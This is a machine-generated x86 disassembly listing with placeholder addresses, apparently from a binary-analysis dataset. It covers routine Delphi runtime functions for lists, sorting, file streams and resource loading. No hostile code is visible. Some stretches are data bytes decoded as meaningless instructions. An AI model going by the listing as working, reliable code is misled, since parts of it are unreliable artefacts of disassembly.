lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403f0c
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028c8
sub_41abec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419c44
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419c44
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403f0c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41ac0b
idiv [ ebp + eax + 0x3b ]
jae r-xdata
adc bh bh
xchg edx eax
test [ eax ] al
add [ eax ] al
jl r-xdata
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403f0c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419c44
sub_41ac48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419c44
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41ac88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a9a0
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ac88
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41ad38
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41ad94
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41ac88
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41ade8
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41ae1c
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41ae80
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41aed4
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403078
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
mov esp ebp
pop ebp
retn
sub_41af20
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403070
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41aed4
pop ecx
mov eax [ ebx ]
call sub_4030b4
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41aed4
pop ecx
sub_41afa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41b014
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
sub_41b04c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
sub_41b084
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41ae08
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026cc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41b160
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b167
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41b014
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41b04c
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41b178
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b860
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b1c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41d894
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b1cf
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_41b1e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b860
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b230
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41f028
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b237
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_41b23c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_41b298
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4085ec
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41b2d8
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40ce5c
pop ebx
pop ebp
retn 0x8
sub_41b300
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41b344
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_41b344
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41b46d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_40348c
movzx edx di
mov eax esi
call sub_408510
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b23c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_40858c
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b23c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b474
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403edc
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4087bc
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40aff4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4087bc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40aff4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
jmp r-xdata
sub_41b474
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_41b498
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
call sub_408624
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_41b4d4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028c8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41b50c
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41b530
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_41b55c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_41b574
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41ae08
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41b014
sub_41b5ac
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41b4cc
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41b5d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41b5ac
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41b600
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406b34
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406b18
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406b08
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
test ecx ecx
jne r-xdata
sub_41b68c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028c8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41b5ac
sub_41b6dc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404378
mov ecx eax
mov edx esi
mov eax edi
call sub_41b7a4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_41b734
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b797
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b79e
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_41b7a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41b734
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41b4cc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41b734
pop ecx
sub_41b810
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406b04
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_41b860
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026cc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_41b8a8
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026ec
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_41b8d8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xb9
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
mov ecx 0x180041
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
imul edi [ eax + 0x75 ] r-xdata
cwde
mov ecx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov ecx 0x180041
add [ eax ] al
aam 0xb8
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
dec esp
mov edx 0xe0041
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f0c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f0c
mov eax esi
test bl bl
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
pop esp
mov edx 0x540e0041
push eax
jb r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403fa8
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404418
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40348c
sub_41b9ac
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f0c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f0c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_41ba04
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403fa8
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404418
mov al 0x1
inc ebx
sub_41ba5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bad3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4057b4
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_415600
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bada
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_414948
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4057b4
mov ecx eax
mov eax esi
pop edx
call sub_40d350
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4057b4
sub_41bae0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41bb86
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb8d
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403fa8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_421240
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407e74
test al al
je r-xdata
inc ebx
